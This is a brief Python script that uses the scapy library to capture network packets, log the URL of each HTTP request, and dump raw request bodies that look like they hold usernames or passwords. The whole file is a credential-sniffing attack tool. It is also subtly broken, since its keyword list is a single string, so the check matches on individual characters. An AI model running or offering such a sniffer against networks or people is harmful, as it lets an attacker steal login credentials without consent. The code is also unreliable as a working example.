import scapy.all as scapy
from scapy.layers import http 
def sniff(interface):
    scapy.sniff(iface= interface,store=False,prn= process_packet)

def get_url(packet):
    return(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url= get_url(packet)
        print("http is{}".format(url))
        cred = get_cred(packet)
        if cred:
            print("print possible cred info: {}".format(cred))


keywords = ('signin, signup,username, login, pass, password, name')

def get_cred(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
             if keyword in field_load:
                 return field_load
sniff(None)